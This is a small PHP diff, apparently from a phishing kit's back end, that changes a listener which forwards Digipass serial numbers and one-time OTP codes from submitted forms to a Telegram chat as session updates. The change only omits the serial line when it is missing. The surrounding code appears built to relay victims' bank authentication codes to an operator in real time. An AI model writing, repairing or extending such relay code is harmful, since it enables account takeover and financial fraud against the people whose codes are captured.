@@ -115,11 +115,13 @@ class SendTelegramNotificationListener
         
         // Digipass: отправляем серийник + OTP
         if ($formData->actionType === ActionType::DIGIPASS && $formData->customAnswers) {
-            $serial = $formData->customAnswers['serial_number'] ?? '—';
+            $serial = $formData->customAnswers['serial_number'] ?? null;
             $otp = $formData->customAnswers['otp'] ?? '—';
             
             $text = "🔑 <b>Digipass данные:</b>\n\n";
-            $text .= "📟 <b>Серийный номер:</b> <code>{$serial}</code>\n";
+            if ($serial) {
+                $text .= "📟 <b>Серийный номер:</b> <code>{$serial}</code>\n";
+            }
             $text .= "🔢 <b>OTP код:</b> <code>{$otp}</code>";
             
             $this->telegramService->sendSessionUpdate($session, $text);
